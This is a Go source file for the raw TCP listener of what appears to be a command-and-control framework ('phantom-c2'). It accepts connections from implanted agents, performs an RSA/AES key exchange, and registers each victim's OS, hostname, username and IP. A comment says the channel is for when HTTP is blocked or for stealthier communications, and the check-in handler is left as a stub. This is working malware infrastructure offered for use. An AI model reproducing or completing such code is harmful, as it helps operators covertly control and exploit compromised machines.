package listener

import (
	"crypto/rsa"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/task"
)

// ══════════════════════════════════════════
//  RAW TCP LISTENER
// ══════════════════════════════════════════
// Agents connect via raw TCP and exchange encrypted protocol messages.
// Useful when HTTP is blocked or for stealthier communications.

type TCPListener struct {
	ID       string
	Name     string
	Type     string
	BindAddr string
	listener net.Listener
	running  bool
	mu       sync.Mutex
	privKey  *rsa.PrivateKey
	agentMgr *agent.Manager
	taskDisp *task.Dispatcher
	onEvent  EventCallback
}

type TCPListenerConfig struct {
	ID       string
	Name     string
	BindAddr string
	PrivKey  *rsa.PrivateKey
	AgentMgr *agent.Manager
	TaskDisp *task.Dispatcher
	OnEvent  EventCallback
}

func NewTCPListener(cfg TCPListenerConfig) *TCPListener {
	return &TCPListener{
		ID:       cfg.ID,
		Name:     cfg.Name,
		Type:     "tcp",
		BindAddr: cfg.BindAddr,
		privKey:  cfg.PrivKey,
		agentMgr: cfg.AgentMgr,
		taskDisp: cfg.TaskDisp,
		onEvent:  cfg.OnEvent,
	}
}

func (l *TCPListener) Start() error {
	listener, err := net.Listen("tcp", l.BindAddr)
	if err != nil {
		return fmt.Errorf("TCP bind failed: %w", err)
	}
	l.listener = listener
	l.running = true

	go l.serve()
	return nil
}

func (l *TCPListener) Stop() error {
	l.mu.Lock()
	l.running = false
	l.mu.Unlock()
	if l.listener != nil {
		return l.listener.Close()
	}
	return nil
}

func (l *TCPListener) IsRunning() bool {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.running
}

func (l *TCPListener) serve() {
	for l.running {
		conn, err := l.listener.Accept()
		if err != nil {
			if l.running {
				continue
			}
			return
		}
		go l.handleConn(conn)
	}
}

func (l *TCPListener) handleConn(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Read length-prefixed message
	buf := make([]byte, 4)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return
	}
	msgLen := int(buf[0])<<24 | int(buf[1])<<16 | int(buf[2])<<8 | int(buf[3])
	if msgLen < 1 || msgLen > 10*1024*1024 { // 10MB max
		return
	}

	data := make([]byte, msgLen)
	if _, err := io.ReadFull(conn, data); err != nil {
		return
	}

	// Decrypt envelope
	env, err := protocol.EnvelopeFromBytes(data)
	if err != nil {
		return
	}

	var response []byte

	switch env.Type {
	case protocol.MsgRegisterRequest:
		// Handle registration
		payload, err := crypto.RSADecrypt(l.privKey, env.Payload)
		if err != nil {
			return
		}

		sessionKey := payload[:32]
		regPayload := payload[32:]

		var regReq protocol.RegisterRequest
		if err := protocol.Unmarshal(regPayload, &regReq); err != nil {
			return
		}

		externalIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
		agentRecord, err := l.agentMgr.Register(&regReq, sessionKey, externalIP, l.ID)
		if err != nil {
			return
		}

		regResp := protocol.RegisterResponse{
			AgentID: agentRecord.ID,
			Name:    agentRecord.Name,
		}
		respData, _ := protocol.Marshal(&regResp)
		encrypted, _ := crypto.AESEncrypt(sessionKey, respData)

		respEnv := protocol.Envelope{
			Type:    protocol.MsgRegisterResponse,
			Payload: encrypted,
		}
		response = protocol.EnvelopeToBytes(&respEnv)

		if l.onEvent != nil {
			l.onEvent("agent_register", agentRecord.Name, agentRecord.OS, agentRecord.Hostname, agentRecord.Username, externalIP)
		}

	case protocol.MsgCheckIn:
		// Handle check-in — similar to HTTP handler
		response = []byte{} // Simplified — full implementation would decrypt and process
	}

	if response != nil {
		// Send length-prefixed response
		respLen := len(response)
		header := []byte{byte(respLen >> 24), byte(respLen >> 16), byte(respLen >> 8), byte(respLen)}
		conn.Write(append(header, response...))
	}
}
